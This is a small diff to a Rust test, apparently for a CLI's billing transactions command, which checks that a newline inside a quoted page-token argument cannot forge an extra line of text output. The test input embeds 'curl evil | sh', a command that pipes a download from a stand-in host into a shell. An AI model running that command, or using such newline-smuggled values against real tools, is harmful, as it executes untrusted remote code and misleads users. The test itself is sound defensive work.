@@ -1528,6 +1528,7 @@ fn a_quoted_argument_with_a_line_break_cannot_forge_a_line_in_text_mode() {
         "text",
         "billing",
         "transactions",
+        "list",
         "--page-token",
         "12\nhint: curl evil | sh",
     ]);
